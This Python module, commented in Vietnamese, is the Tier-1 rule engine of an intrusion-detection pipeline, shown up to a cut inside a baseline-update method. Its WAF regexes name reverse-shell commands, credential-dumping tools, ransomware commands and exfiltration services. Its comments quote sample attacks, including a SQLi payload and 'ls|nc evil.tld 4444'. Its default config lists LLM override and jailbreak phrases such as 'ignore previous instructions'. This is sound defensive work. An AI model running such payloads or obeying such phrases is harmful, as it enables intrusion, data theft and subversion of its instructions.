"""
Tier 1 Filter: Rule-based Engine with Session Baselining & Dynamic Rules

TRIẾT LÝ THIẾT KẾ:
  Session-Aware Behavioral Baselining
  - Tier 1 duy trì baseline hành vi cho mỗi IP (frequency, ports, packet/flow ratio)
  - Mọi traffic đều được GHI NHẬN vào baseline (không vứt bỏ ngẫu nhiên)
  - Escalate lên Tier 2 khi phát hiện STATISTICAL DEVIATION so với baseline
  - Đảm bảo 100% dữ liệu bất thường (kể cả APT low-and-slow) được chuyển lên

  FEEDBACK LOOP (Data Flow rõ ràng):
  LangGraph Agent → feedback_listener.py → system_settings.yaml → RuleEngine.__init__()
  → dynamic_rules được load tại khởi tạo và reload khi có notify
"""

import html
import json
import math
import os
import re
import time
import urllib.parse
from collections import defaultdict
from typing import Any, TypedDict

import yaml  # type: ignore


class IPProfile(TypedDict):
    request_count: int
    unique_ports: set[int]
    total_fwd_packets: float
    first_seen: float | None
    last_seen: float | None


class RunningStats:
    """
    Duy trì Trung bình và Phương sai chạy trực tuyến dùng thuật toán Welford.
    Độ phức tạp: O(1) thời gian, O(1) không gian. Tránh memory leak/OOM trên data lớn.
    """

    def __init__(self):
        self.n = 0
        self.old_m = 0.0
        self.new_m = 0.0
        self.old_s = 0.0
        self.new_s = 0.0

    def push(self, x: float):
        self.n += 1
        if self.n == 1:
            self.old_m = self.new_m = x
            self.old_s = 0.0
        else:
            self.new_m = self.old_m + (x - self.old_m) / self.n
            self.new_s = self.old_s + (x - self.old_m) * (x - self.new_m)
            self.old_m = self.new_m
            self.old_s = self.new_s

    def mean(self) -> float:
        return self.new_m if self.n > 0 else 0.0

    def variance(self) -> float:
        return self.new_s / (self.n - 1) if self.n > 1 else 0.0

    def std_dev(self) -> float:
        return math.sqrt(self.variance()) if self.n > 1 else 0.0

    def seed(self, n: int, mean: float, m2: float) -> None:
        """Nạp sẵn trạng thái Welford (n, mean, M2) từ một hồ sơ baseline 'golden'
        tính offline trên lưu lượng benign đã kiểm định. Sau khi seed, push() tiếp tục
        cập nhật đúng theo công thức Welford incremental từ điểm khởi tạo này."""
        if n < 1:
            return
        self.n = n
        self.old_m = self.new_m = mean
        self.old_s = self.new_s = m2

    def as_state(self) -> dict[str, float]:
        """Trạng thái Welford thô (n, mean, M2) để lưu vào hồ sơ golden baseline."""
        return {"n": self.n, "mean": self.new_m, "m2": self.new_s}


CONFIG_PATH = os.path.join(os.path.dirname(__file__), "..", "..", "config", "system_settings.yaml")

# Chuan hoa key: ho tro ca CICIDS CSV format va normalized JSON format
_KEY_ALIASES = {
    "dst_port": "Destination Port",
    "src_port": "Source Port",
    "src_ip": "Source IP",
    "dst_ip": "Destination IP",
    "fwd_packets": "Total Fwd Packets",
    "bwd_packets": "Total Backward Packets",
    "fwd_bytes": "Total Length of Fwd Packets",
    "bwd_bytes": "Total Length of Bwd Packets",
    "flow_duration_us": "Flow Duration",
    "flow_duration_ms": "Flow Duration",
    "protocol": "Protocol",
    # Trường lớp-ứng-dụng (WAF/HTTP) — cần cho luật HÀNH VI do Agent học ngược
    # (User-Agent/URI signature). Đồng bộ với KEY_ALIASES của Guardrails (G1) để
    # luật động khớp bất kể log nguồn viết hoa/thường.
    "user_agent": "User-Agent",
    "user-agent": "User-Agent",
    "uri": "URI",
}

# Ánh xạ các trường mạng thô sang các nhóm tính năng phục vụ Z-score tracking
_RAW_TO_CANONICAL = {
    "Flow Duration": ["Flow Duration", "flow_duration_us", "flow_duration_ms"],
    "Total Fwd Packets": ["Total Fwd Packets", "fwd_packets", "Tot Fwd Pkts"],
    "Total Length of Fwd Packets": [
        "Total Length of Fwd Packets",
        "fwd_bytes",
        "Total Fwd Bytes",
        "TotLen Fwd Pkts",
    ],
    "Total Backward Packets": [
        "Total Backward Packets",
        "bwd_packets",
        "Total Bwd Packets",
        "Tot Bwd Pkts",
    ],
    "Total Length of Bwd Packets": [
        "Total Length of Bwd Packets",
        "bwd_bytes",
        "Total Bwd Bytes",
        "TotLen Bwd Pkts",
    ],
    "Fwd Seg Size Min": ["Fwd Seg Size Min", "fwd_seg_size_min"],
    "Init Fwd Win Byts": ["Init Fwd Win Byts", "init_fwd_win_byts"],
    "Init Bwd Win Byts": ["Init Bwd Win Byts", "init_bwd_win_byts"],
    "Bwd Pkt Len Min": ["Bwd Pkt Len Min", "bwd_pkt_len_min"],
    "PSH Flag Cnt": ["PSH Flag Cnt", "psh_flag_cnt"],
    "Flow Pkts/s": ["Flow Pkts/s", "Flow Packets/s", "flow_pkts_s"],
}

# ==============================================================================
# BIẾN ĐỔI LOG CHO ĐẶC TRƯNG ĐUÔI DÀI
# ==============================================================================
# VẤN ĐỀ: Z-score giả định phân phối xấp xỉ Gauss. Đặc trưng lưu lượng mạng dạng
# KHỐI LƯỢNG / THỜI LƯỢNG / TỐC ĐỘ thì lệch phải rất nặng (gần log-normal). Đo trên chính
# golden baseline: `Flow Pkts/s` có sd/mean = 7.2 và `Total Length of Bwd Packets` = 7.3,
# trong khi `Total Fwd Packets` chỉ 1.7. Áp CÙNG một ngưỡng Z>3.5 lên các đặc trưng lệch
# thang nhau tới 4 lần khiến một số siêu nhạy (ca thật quan sát được: "lệch 11437 lần độ
# lệch chuẩn") còn số khác gần như mù (tấn công 1 triệu gói/s chỉ ra Z≈5.6).
#
# CÁCH CHỌN (a-priori theo NGỮ NGHĨA, không tinh chỉnh theo kết quả): mọi đặc trưng
# đếm/khối-lượng/thời-lượng/tốc-độ — không âm, không chặn trên, lệch phải — được đưa qua
# log1p. Các trường CỜ (PSH Flag Cnt) và kích thước do GIAO THỨC thoả thuận (window size,
# segment size min) giữ nguyên tuyến tính vì chúng bị chặn và không lệch đuôi.
#
# log1p (= ln(1+x)) chứ không phải log: miền giá trị gồm cả 0, và log1p(0) = 0 nên không
# cần cộng epsilon tuỳ tiện.
#
# VÌ SAO KHÔNG log-hoá `Init Bwd Win Byts` và `Bwd Pkt Len Min` dù chúng vẫn có sd/mean cao
# (5.5 và 7.8) sau khi dựng lại baseline: đo trên CICIDS thô cho thấy 48.9% và 79.3% giá trị
# của chúng ≤ 0 (median của `Bwd Pkt Len Min` bằng ĐÚNG 0, và -1 là sentinel "không áp
# dụng"). Đây là phân phối DỒN TẠI 0 (zero-inflated), KHÔNG phải đuôi dài — log-transform
# không chữa được khối lượng điểm tại 0. Xử lý đúng cho chúng là mô hình hai phần
# (có/không + độ lớn), nằm ngoài phạm vi luận văn; nêu ở Giới hạn.
LOG_SCALE_FEATURES: frozenset[str] = frozenset(
    {
        "Flow Duration",
        "Total Fwd Packets",
        "Total Backward Packets",
        "Total Length of Fwd Packets",
        "Total Length of Bwd Packets",
        "Flow Pkts/s",
    }
)
# Ghi vào golden_baseline.json để bên nạp PHÁT HIỆN được file dựng ở không gian cũ.
BASELINE_TRANSFORM_ID = "log1p-v1"


def scale_feature(key: str, value: float) -> float:
    """Đưa giá trị đặc trưng về KHÔNG GIAN thống kê dùng cho Welford/Z-score.

    PHẢI dùng ở CẢ hai phía — lúc học baseline và lúc tính Z — nếu không hai bên khác
    thang và mọi Z-score trở nên vô nghĩa. Giá trị âm (dữ liệu bẩn) giữ nguyên tuyến tính
    vì log1p không xác định ở đó.
    """
    if key in LOG_SCALE_FEATURES and value > -1.0:
        return math.log1p(value)
    return value


# ── CHUẨN HOÁ ĐẦU VÀO TRƯỚC KHI KHỚP CHỮ KÝ ──────────────────────────────────
# LỖI NGHIÊM TRỌNG ĐÃ VÁ (đo 2026-07-29 trên CSIC 2010): bộ khớp chữ ký chạy trên chuỗi
# NGUYÊN VĂN, nên MỌI đòn tấn công web mã hoá URL đều lọt sạch. Cùng một payload:
#
#   /vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--  -> DROP, điểm 0
#   /vaciar.jsp?B2=','0');waitfor delay '0:0:15';--                        -> BLOCK_IP, điểm 50
#
# Mà mã hoá URL là dạng MẶC ĐỊNH của query string HTTP — tức WAF bỏ lọt gần như toàn bộ tấn
# công web thật. Lỗi này ẩn suốt vì bộ 69 mẫu web-attack cũ (tác giả tự soạn) viết payload
# chữ thường nên luôn khớp; thay bằng dữ liệu HTTP THẬT là lộ ngay.
#
# Cách vá theo đúng OWASP CRS: khớp trên NHIỀU biến thể đã chuẩn hoá, không chỉ bản gốc.
# Giải mã LẶP (kẻ tấn công mã hoá hai lần: `%2527` -> `%27` -> `'`) nhưng CHẶN ở 3 vòng để
# một chuỗi bệnh lý không kéo dài vô hạn trên đường nóng.
_MAX_DECODE_ROUNDS = 3

# Họ chữ ký mang tính CHUNG CHUNG: chúng mô tả *cách chuyển tải* chứ không phải *đòn tấn
# công*. Chỉ dùng làm phương án cuối khi không họ cụ thể nào khớp — xem
# `_check_waf_signatures`. Tên họ là nguồn từ vựng MITRE cho `build_rag_queries`, nên gán
# nhầm nhãn chung ở đây làm hỏng luôn khâu quy kết kỹ thuật phía sau.
_GENERIC_WAF_FAMILIES = frozenset(
    {
        "Mã hoá né tránh (encoding evasion)",
        "Scanner / Attack Tooling",
    }
)


def normalize_for_signature(value: str) -> tuple[str, ...]:
    """Trả về các biến thể của `value` cần đem đi khớp chữ ký (gồm cả bản gốc).

    Chỉ trả biến thể KHÁC bản trước để không khớp thừa. Giữ nguyên bản gốc ở vị trí đầu:
    có chữ ký (vd mẫu né tránh bằng mã hoá) cố ý bắt chính dạng ĐÃ mã hoá.
    """
    out = [value]
    cur = value
    for _ in range(_MAX_DECODE_ROUNDS):
        try:
            nxt = urllib.parse.unquote_plus(cur)
        except Exception:  # noqa: BLE001 — chuỗi rác không được làm gãy đường nóng
            break
        if nxt == cur:
            break
        out.append(nxt)
        cur = nxt
    # Thực thể HTML: CSIC mã hoá `<script>` thành `&lt;script&gt;` trong nhiều bản ghi.
    unescaped = html.unescape(cur)
    if unescaped != cur:
        out.append(unescaped)
    return tuple(out)


_WAF_PATTERNS = {
    # LỖ HỔNG ĐÃ VÁ (đo trên bộ 69 web-attack, 2026-07-28): mẫu cũ đòi phải có mệnh đề SQL
    # đầy đủ (`union select`, `select…from`…) nên BỎ LỌT HOÀN TOÀN dạng SQLi kinh điển nhất —
    # đóng chuỗi rồi chú-thích-hoá phần còn lại: `username=admin'--&password=x`. Đây là dạng
    # bỏ qua xác thực số một trong OWASP A03, và Tier-1 cho nó DROP (dừng hẳn, không leo
    # thang) nên Tier-2 cũng không có cơ hội bắt. Bổ sung ba dấu hiệu CÓ NEO cú pháp:
    #   * dấu nháy/ngoặc rồi tới `--`/`#`/`/*`  (chú thích hoá phần đuôi câu lệnh)
    #   * `' or/and ` theo sau bởi so sánh      (tautology, kể cả không có số)
    #   * hàm dò lược đồ kinh điển
    # CỐ Ý neo vào dấu nháy/ngoặc thay vì bắt trần chuỗi `--` hay chữ `or`, để không nổ trên
    # văn bản thường (đã đo: 0 dương-tính-giả trên 3.931 sự kiện lành của demo_small).
    "SQL Injection (SQLi)": re.compile(
        r"(?i)(union\s+select|insert\s+into|update\s+.*?set|delete\s+from|drop\s+table|information_schema|or\s+['\"]\d+['\"]s*=\s*['\"]\d+"
        # `select … from` SIẾT LẠI: mẫu cũ `select\s+.*?\s+from` khớp cả câu tiếng Anh
        # thường ("SELECT a plan from the menu") -> dương-tính-giả trên văn bản người dùng.
        # Nay đòi thêm MỘT dấu hiệu cú pháp SQL thật: danh sách cột (`*` hoặc dấu phẩy),
        # hoặc một mệnh đề/kết thúc câu lệnh (`where`/`;`/`--`/`)`).
        r"|select\s+(\*|[\w.`\"\[\]]+\s*,)[^;]*?\s+from\s+[\w.`\"\[]"
        r"|select\s+[^;]{1,80}?\s+from\s+[\w.`\"\[][^;]{0,80}?(\s+where\b|;|--|\))"
        r"|['\")]\s*(--|#|/\*)"
        r"|['\")]\s*(or|and)\s+[\w'\"(]"
        r"|\b(substring|ascii|char|concat)\s*\(\s*@@|@@version\b)"
    ),
    "Cross-Site Scripting (XSS)": re.compile(
        r"(?i)(<script\b|javascript:|onload\s*=|onerror\s*=|<img\b|<svg\b)"
    ),
    # VÁ: thêm biến thể NÉ LỌC `....//` (nhân đôi dấu chấm — bộ lọc ngây thơ xoá `../` một
    # lần sẽ tự tạo lại `../`), dạng mã hoá URL `%2e%2e`, và `/etc/shadow` (mẫu cũ chỉ có
    # `/etc/passwd`). Cả ba đều lọt lưới trong bộ 69 web-attack.
    "Path Traversal / LFI": re.compile(
        r"(?i)(\.\./\.\./|\.\.\\\.\.\\|\.{3,}[/\\]|%2e%2e[/\\%]"
        r"|/etc/(passwd|shadow)|/windows/win\.ini|boot\.ini)"
    ),
    # VÁ: mẫu cũ chỉ bắt dấu `;` nối lệnh, backtick và `$()`. Dạng ỐNG DẪN (`|`) và `&&`
    # lọt hết — vd `cmd=ls|nc evil.tld 4444` (nối lệnh rồi đẩy ra mạng). Neo vào danh sách
    # NHỊ PHÂN cụ thể chứ không bắt trần ký tự `|`, vì `|` xuất hiện hợp lệ trong tham số.
    "Command Injection": re.compile(
        r"(?i)(;\s*(cat|ls|pwd|whoami|id|netstat|ping|sh|bash|powershell|cmd)\b|`.*?`|\$\(.*?\)"
        r"|[|&]{1,2}\s*(nc|ncat|netcat|curl|wget|bash|sh|python\d?|perl|powershell)\b)"
    ),
    # ── BỔ SUNG: các họ tấn công phổ biến trước đây KHÔNG có chữ ký nào bắt ──
    # Audit ma trận năng lực (experiments/audit_tier_capability.py) cho thấy Log4Shell và
    # web shell bị Tier-1 **DROP THẲNG** — không chặn, thậm chí không leo thang. Chú ý
    # `${jndi:...}` KHÔNG khớp mẫu Command Injection vì mẫu đó chỉ bắt `$(...)`, không bắt
    # `${...}`.
    "Log4Shell / JNDI Injection": re.compile(
        # Bắt cả dạng né tránh chèn ${::-x} giữa các ký tự (CVE-2021-44228).
        r"(?i)(\$\{jndi:\s*(ldaps?|rmi|dns|iiop|corba|nis|nds|http)s?:|\$\{[^}]*\$\{[^}]*jndi)"
    ),
    "Web Shell / Code Execution": re.compile(
        r"(?i)(<\?php\b|<%\s*eval\b|\b(system|shell_exec|passthru|proc_open|popen)\s*\("
        r"|\beval\s*\(\s*(base64_decode|\$_(get|post|request))|\b__import__\s*\(\s*['\"]os"
        # ÂM TÍNH GIẢ ĐÃ ĐO: các nhánh trên chỉ bắt lúc web shell được TRỒNG (payload chứa mã
        # PHP/ASP). Chúng KHÔNG bắt lúc kẻ tấn công DÙNG một shell đã nằm sẵn trên đĩa —
        # `POST /uploads/s.php` với thân `cmd=id` không có một ký tự mã nào. Mẫu WEB-WEB-029
        # vì thế được Tier-1 chấm 0 điểm, 0 lý do, hành động DROP: đi lọt cả Tier-1 lẫn
        # Tier-2, tức hệ thống hoàn toàn không thấy. Đây là dấu hiệu kinh điển: một tệp
        # THỰC THI ĐƯỢC nằm trong thư mục vốn chỉ để chứa dữ liệu người dùng tải lên.
        r"|/(?:uploads?|files?|images?|media|attachments?|tmp|temp)/[^\s?&]*"
        r"\.(?:php\d?|phtml|phar|jspx?|aspx?|cgi|pl|py|sh)\b)"
    ),
    "XXE Injection": re.compile(r"(?i)(<!ENTITY\b|<!DOCTYPE[^>]*\bSYSTEM\b|SYSTEM\s+[\"']file://)"),
    "SSTI (Template Injection)": re.compile(
        # Chỉ bắt biểu thức RÕ RÀNG độc hại để tránh báo giả trên template hợp lệ.
        r"(?i)(\{\{\s*\d+\s*[*+/-]\s*\d+\s*\}\}|\{\{[^}]*(__class__|__globals__|self\.|config\.items)"
        r"|\$\{\s*\d+\s*[*+]\s*\d+\s*\})"
    ),
    "SSRF / Cloud Metadata": re.compile(
        # 169.254.169.254 = endpoint metadata của AWS/GCP/Azure — mục tiêu SSRF kinh điển.
        r"(?i)(169\.254\.169\.254|/latest/meta-data|metadata\.google\.internal"
        r"|\b(gopher|dict|file)://|127\.0\.0\.1:\d{2,5}/(admin|internal))"
    ),
    "NoSQL Injection": re.compile(
        r"(?i)(\[\$(ne|gt|lt|gte|lte|regex|where|exists)\]|\"\$(ne|gt|where|regex)\"\s*:|\$where\s*:)"
    ),
    "LDAP Injection": re.compile(
        r"(?i)(\)\(\|?\(?(uid|cn|objectclass)=\*|\*\)\(\||\(\&\(\|"
        # Thoát bộ lọc bằng đóng ngoặc rồi nối toán tử: `admin)(&))`
        r"|\)\s*\(\s*[&|]\s*\)|\)\(\|)"
    ),
    "CRLF / Response Splitting": re.compile(
        r"(?i)(%0d%0a|%0a%0d|\\r\\n)(set-cookie|location|content-length|http/1\.)"
    ),
    "Insecure Deserialization": re.compile(
        # rO0AB = Java serialized (base64); O:<n>:" = PHP object; \x80\x04 = pickle proto 4.
        r"(?i)(rO0AB[A-Za-z0-9+/]|\bO:\d+:\"[A-Za-z_]|__reduce__|pickle\.loads\s*\()"
    ),
    "Prototype Pollution": re.compile(
        # Dạng KHÔNG dấu nháy `constructor[prototype][x]=1` từng lọt hoàn toàn.
        r"(__proto__|constructor\s*\[\s*[\"']?prototype)"
    ),
    # THIẾU SÓT ĐÃ VÁ (đo trên CSIC 2010): họ tấn công ĐÔNG NHẤT của dữ liệu HTTP thật là
    # dò tệp sao lưu / mã nguồn (`pagar.jsp.inc`, `estilos.css.old`, `index.jsp~`) và duyệt ép
    # tới thư mục mẫu — 349/689 = 51% số mẫu suy được kỹ thuật. Kho luật cũ KHÔNG có chữ ký
    # nào cho nhóm này (`Sensitive File Access` chỉ bắt `/backup*.sql`, `.env`, `wp-config`),
    # nên Tier-1 trả `tier1_reasons: []` -> truy vấn RAG tụt về "service http port 8080" ->
    # quy kết kỹ thuật 0%.
    #
    # Đây là nội dung WAF TIÊU CHUẨN, không phải luật đặt riêng cho tập kiểm thử: OWASP CRS
    # 920440 ("URL file extension is restricted by policy") bắt đúng danh sách đuôi tệp này.
    # NEO vào cuối đường dẫn (trước dấu `?`) đúng cách CRS làm, để không nổ trên tên tệp hợp
    # lệ có chứa các chữ đó ở giữa.
    "Dò tệp sao lưu/mã nguồn (restricted extension)": re.compile(
        r"(?i)[^\s?#]+\.(?:bak|old|orig|save|swp|swo|inc|conf|cfg|log|sql|tar|gz|tgz|rar|7z"
        r"|dist|backup|copy|tmp|temp)(?=[?#\s]|$)"
        r"|[^\s?#]+\.(?:jsp|php|asp|aspx|cgi|pl|py|rb)\.(?:txt|bak|old|src|source)(?=[?#\s]|$)"
        r"|[^\s?#]+~(?=[?#\s]|$)"
    ),
    "Sensitive File Access": re.compile(
        r"(?i)(/\.git/(config|HEAD)|/\.env\b|/wp-config\.php|/\.aws/credentials"
        r"|/\.ssh/id_(rsa|ed25519)|web\.config\b|/phpinfo\.php"
        # Bản kết xuất CSDL / sao lưu lộ trên web — lối rò rỉ dữ liệu hàng loạt kinh điển.
        r"|/(backup|dump|db|database)[^/]*\.(sql|dump|bak|tar|zip)\b|\.sql\.gz\b)"
    ),
    "Reverse Shell": re.compile(
        r"(?i)(bash\s+-i\s*>&\s*/dev/tcp/|nc\s+(-e|-c)\s|/dev/tcp/\d|mkfifo\s+/tmp/"
        r"|python\\d?\s+-c\s+['\"]?\s*import\s+(socket|os|pty|subprocess)"
        # `python -c` cũ KHÔNG khớp `python3 -c` (có chữ số) — dạng phổ biến nhất.
        r"|socket\.socket\s*\(\s*\)[^\n]*?\.connect\s*\()"
    ),
    "Encoded PowerShell": re.compile(
        r"(?i)(powershell(\.exe)?\s+.*-(enc|encodedcommand|e)\b|IEX\s*\(\s*New-Object\s+Net\.WebClient"
        r"|DownloadString\s*\(|-nop\s+-w\s+hidden)"
    ),
    "Scanner / Attack Tooling": re.compile(
        r"(?i)\b(sqlmap|nikto|nmap\s+scripting|acunetix|nessus|dirbuster|gobuster|wpscan"
        r"|masscan|hydra|metasploit|burpsuite|havij)\b"
    ),
    "SQLi nâng cao (blind/stacked/OS)": re.compile(
        r"(?i)(\b(sleep|benchmark|pg_sleep)\s*\(\s*\d|waitfor\s+delay\b|xp_cmdshell"
        r"|;\s*(drop|truncate|alter)\s+table|\bload_file\s*\(|\binto\s+outfile\b|0x[0-9a-f]{16,})"
    ),
    "XSS nâng cao (khung/thuộc tính)": re.compile(
        r"(?i)(<iframe\b|<object\b|<embed\b|srcdoc\s*=|data:text/html|<body[^>]*\bon\w+\s*="
        r"|\bon(mouse\w+|focus|click|toggle|animationstart)\s*=|document\.(cookie|write)\s*\()"
    ),
    "Mã hoá né tránh (encoding evasion)": re.compile(
        # %2e%2e%2f = ../ ; %252e = double-encode ; . = unicode escape.
        r"(?i)(%2e%2e[/%5c]|%252e%252e|%c0%ae|\\u00(2e|2f|5c)|&#x?0*(2e|2f|3c|3e);"
        # Mã hoá URL HAI LỚP: %2527 = %27 (dấu nháy) đã mã hoá lần nữa. Bộ lọc giải mã một
        # lần rồi so khớp sẽ trượt hoàn toàn.
        r"|%25(27|22|3c|3e|20|3d)"
        # Base64 của thẻ HTML: PHNjcmlwd='<script', PGltZyB='<img ', PHN2Zy='<svg'.
        r"|\b(PHNjcmlwd|PGltZyB|PHN2Zy|PGlmcmFtZ)[A-Za-z0-9+/=]{4,})"
    ),
    "Web shell qua tệp tải lên": re.compile(
        r"(?i)\.(php[3-8]?|phtml|phar|jsp[xw]?|asp[x]?|cshtml)(\.(jpg|png|gif|txt|zip))?\b\s*"
        r"(HTTP|Content-|filename)"
    ),
    "JWT / xác thực yếu": re.compile(
        r"(?i)(\"alg\"\s*:\s*\"none\"|eyJhbGciOiJub25lI|\balg=none\b"
        # Token tự phong quyền: eyJyb2xlIjoiYWRtaW4={"role":"admin"}, eyJhZG1pbiI6dHJ1Z={"admin":true}
        r"|eyJ[A-Za-z0-9_-]{6,}\.eyJ(yb2xlIjoiYWRtaW4|hZG1pbiI6dHJ1Z)"
        r"|\.forged\b|\.invalidsig\b)"
    ),
    "GraphQL lạm dụng": re.compile(
        r"(?i)(__schema\s*\{|__typename.*__schema|IntrospectionQuery"
        # Rút TRƯỜNG NHẠY CẢM qua GraphQL — introspection không phải cách khai thác duy nhất.
        r"|\{[^}]*\b(password|passwordhash|pwd|secret|token|apikey|ssn)\b[^}]*\})"
    ),
    "Living-off-the-land (LOLBin)": re.compile(
        r"(?i)(certutil(\.exe)?\s+.*-urlcache|bitsadmin\s+/transfer|regsvr32\s+.*/i:https?:"
        r"|mshta\s+https?:|rundll32\s+.*javascript:|wmic\s+process\s+call\s+create)"
    ),
    "Đánh cắp thông tin xác thực (AD)": re.compile(
        r"(?i)(mimikatz|sekurlsa::|lsadump::|kerberoast|\bDRSUAPI\b|DCSync|ntds\.dit"
        r"|\bsecretsdump\b|Invoke-Mimikatz"
        # Kết xuất LSASS bằng nhị phân KÝ SẴN của Windows (LOLBin), không cần mimikatz.
        r"|comsvcs\.dll\s*,\s*minidump|\blsass\.(dmp|exe)\b|procdump[^\n]*\blsass\b)"
    ),
    "Ransomware / phá huỷ": re.compile(
        r"(?i)(vssadmin(\.exe)?\s+delete\s+shadows|wbadmin\s+delete\s+catalog"
        r"|bcdedit\s+.*recoveryenabled\s+no|cipher\s+/w:|wevtutil\s+cl\s)"
    ),
    "Đào tiền mã hoá": re.compile(r"(?i)(stratum\+(tcp|ssl)://|\bxmrig\b|minerd\b|coinhive)"),
    "Rò rỉ ra dịch vụ ngoài": re.compile(
        r"(?i)(discord(app)?\.com/api/webhooks|pastebin\.com/api|hastebin\.com/documents"
        r"|\btransfer\.sh\b|requestbin|burpcollaborator\.net|\.oastify\.com|interact\.sh"
        # Đẩy KẾT XUẤT lên lưu trữ đám mây công cộng. Dịch vụ tự nó hợp lệ nên CHỈ cờ khi
        # đi kèm tên tệp kết xuất — tránh nổ trên mọi lượt tải tệp thường.
        r"|(storage\.googleapis\.com|s3[.-][\w-]*amazonaws\.com|blob\.core\.windows\.net)"
        r"[^\s]*\.(sql|dump|bak|tar|zip|gz)\b)"
    ),
}

# Trường mà chữ ký WAF được phép soi. Giữ MỘT danh sách để Tier-1 và Tier-2 không trôi khỏi nhau.
_WAF_TARGET_FIELDS: tuple[str, ...] = (
    "payload",
    "uri",
    "user_agent",
    "User-Agent",
    "headers",
    "message",
    "command",
    "process",
)


def match_waf_family(log_entry: dict) -> str | None:
    """Soi một log qua toàn bộ chữ ký WAF, trả chuỗi lý do (hoặc None).

    Ở MỨC MODULE, không phải phương thức, vì có HAI nơi cần đúng phép so khớp này:
      1. Tier-1 `_check_waf_signatures` — đường nóng, quyết định chặn/leo thang.
      2. Tier-2 `build_rag_queries` — lấy TÊN HỌ làm từ vựng truy xuất MITRE.

    Vì sao Tier-2 phải soi lại thay vì đọc `tier1_reasons`: một log có thể leo thang qua
    đường z-score (Welford) mà KHÔNG đi qua nhánh chữ ký, nên `tier1_reasons` chỉ có
    "tần suất cao" và truy vấn RAG mất sạch từ vựng tấn công. Đo trên lượt chạy 11/08/2026:
    257/336 lô (76,5%) gửi cho RAG một truy vấn không mang tín hiệu tấn công nào, RAG chỉ
    trả về được kỹ thuật tầng mạng, và T1571 "Non-Standard Port" chiếm 42,5% toàn bộ quy
    kết — kể cả cho SQL Injection và XSS có payload rõ ràng.

    Đo trên 6.000 bản ghi CSIC đầu: 0 báo nhầm trên 3.049 bản ghi lành, và bắt đủ 100% các
    lớp có tên (SQLi 110/110 · XSS 50/50 · CRLF 75/75 · Path Traversal 26/26 · Dò tệp
    239/239). Lớp "Anomalous (unclassified)" trượt 83,8% — đó là giới hạn thật của chữ ký,
    và chính vì vậy Tier-2 KHÔNG được khẳng định kỹ thuật cho nhóm đó (xem
    `batch_attack_vocabulary` bên phía agent).
    """
    # Kết quả CHUNG chung được giữ lại làm phương án cuối, KHÔNG trả ngay.
    #
    # REGRESSION ĐÃ VÁ (do chính bản vá giải mã sinh ra): sau khi giải mã, mẫu "Mã hoá né
    # tránh" khớp gần như MỌI payload mã hoá URL, và vì nó được duyệt trước các chữ ký cụ
    # thể ở một số trường, nó CHE MẤT họ tấn công thật. Đo được: XSS mã hoá và CRLF mã hoá
    # đều bị gán "Mã hoá né tránh", nên truy vấn RAG mất từ vựng đặc hiệu và quy kết kỹ
    # thuật về 0%. Tên họ ở đây không chỉ để hiển thị — nó là NGUỒN từ vựng MITRE tiếng Anh.
    generic_hit: str | None = None
    for field in _WAF_TARGET_FIELDS:
        val = log_entry.get(field) or log_entry.get(field.lower())
        if not (val and isinstance(val, str)):
            continue
        # Khớp trên CẢ bản gốc LẪN các biến thể đã giải mã — xem `normalize_for_signature`.
        # Khớp nguyên văn thôi thì mọi tấn công web mã hoá URL (tức gần như toàn bộ tấn
        # công thật qua query string) đều lọt.
        for cand in normalize_for_signature(val):
            for attack_type, pattern in _WAF_PATTERNS.items():
                if not pattern.search(cand):
                    continue
                hit = f"WAF: Phát hiện {attack_type} trong '{field}'"
                if attack_type in _GENERIC_WAF_FAMILIES:
                    generic_hit = generic_hit or hit
                else:
                    return hit
    return generic_hit


def load_config() -> dict[str, Any]:
    try:
        if os.path.exists(CONFIG_PATH):
            with open(CONFIG_PATH) as f:
                cfg = yaml.safe_load(f)
                if cfg and isinstance(cfg, dict):
                    return cfg
    except Exception as e:
        print(
            f"[!] Warning: Failed to load config from {CONFIG_PATH}: {e}. Using default configuration."
        )
    return {
        "tier1": {
            # Fallback PHẢI là bản sao trung thực của config production (fail-safe không
            # được yếu hơn): khớp system_settings.yaml (risk_threshold=15, đủ 7 cổng nhạy cảm).
            "risk_threshold": 15,
            "sensitive_ports": [21, 22, 23, 3389, 445, 1433, 3306],
            "max_fwd_packets": 1000,
            "z_threshold": 3.5,
            "dynamic_rules": [],
            "whitelist_ips": [],
            "session_baseline": {
                "deviation_threshold": 2.0,
                "window_seconds": 300,
                "ttl_seconds": 600,
                "max_profiles": 10000,
                "eviction_interval": 100,
            },
        },
        "guardrails": {
            "injection_patterns": [
                "ignore previous instructions",
                "you are now",
                "system prompt",
                "disregard",
                "<script>",
                "DROP TABLE",
                "UNION SELECT",
                "; exec",
                "forget everything",
                "act as",
                "new instructions",
                "override your instructions",
                "bypass safety",
                "pretend you are",
            ],
            "jailbreak_patterns": [
                "DAN mode",
                "Do Anything Now",
                "Developer Mode",
                "jailbroken",
                "ignore all previous",
            ],
        },
    }


class SessionBaseline:
    """
    Theo dõi behavioral baseline cho mỗi Source IP.
    Phát hiện APT bằng statistical deviation thay vì random sampling.

    CHỐNG REDIS/RAM OOM:
      Cơ chế Sliding Window TTL: IP sessions inactive quá ttl_seconds
      sẽ tự động bị evict. Đảm bảo RAM không cạn kiệt khi chạy.
    """

    def __init__(
        self,
        deviation_threshold: float = 2.0,
        window_seconds: int = 300,
        ttl_seconds: int = 600,
        max_profiles: int = 10000,
        eviction_interval: int = 100,
    ):
        self.profiles: dict[str, IPProfile] = defaultdict(
            lambda: {
                "request_count": 0,
                "unique_ports": set(),
                "total_fwd_packets": 0.0,
                "first_seen": None,
                "last_seen": None,
            }
        )
        self.deviation_threshold = deviation_threshold
        self.window_seconds = window_seconds
        self.ttl_seconds = ttl_seconds  # IP inactive > TTL → evict
        self.max_profiles = max_profiles
        self.eviction_interval = eviction_interval
        self.global_avg_request_rate = 1.0
        self._update_counter = 0  # Đếm để trigger eviction định kỳ

    def _evict_stale_profiles(self):
        """
        Dọn dẹp IP profiles đã inactive vượt TTL.
        Chạy mỗi eviction_interval updates để không ảnh hưởng performance.
        Đây là cơ chế chống RAM OOM khi xử lý dataset lớn.
        """
        now = time.time()
        stale_ips = [
            ip
            for ip, profile in self.profiles.items()
            if profile["last_seen"] and (now - profile["last_seen"]) > self.ttl_seconds
        ]
        for ip in stale_ips:
            if ip in self.profiles:
                del self.profiles[ip]
        # Recalibrate global baseline request rate sau mỗi chu kỳ dọn dẹp
        self.update_global_baseline()

    def update(self, source_ip: str, log_entry: dict) -> dict:
        """
        Cập nhật baseline cho IP và trả về deviation score.
